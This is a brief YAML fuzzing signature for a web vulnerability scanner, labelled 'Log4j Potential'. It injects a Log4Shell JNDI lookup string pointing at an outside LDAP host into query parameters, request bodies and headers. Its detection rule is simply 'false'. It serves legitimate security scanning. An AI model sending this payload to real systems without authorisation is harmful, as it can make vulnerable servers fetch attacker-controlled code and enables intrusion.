# info to search signature
id: log4j-fuzz
type: fuzz
level: 4
info:
  name: Log4j Potential
  risk: High
variables:
  - log4j: |
      ${jndi:ldap://xd.gy:1389/anpham}
payloads:
    - '{{.log4j}}'
requests:
  - generators:
      - Query("{{.payload}}")
      - Body("{{.payload}}")
      - Header("{{.payload}}")
    detections:
      - >-
        false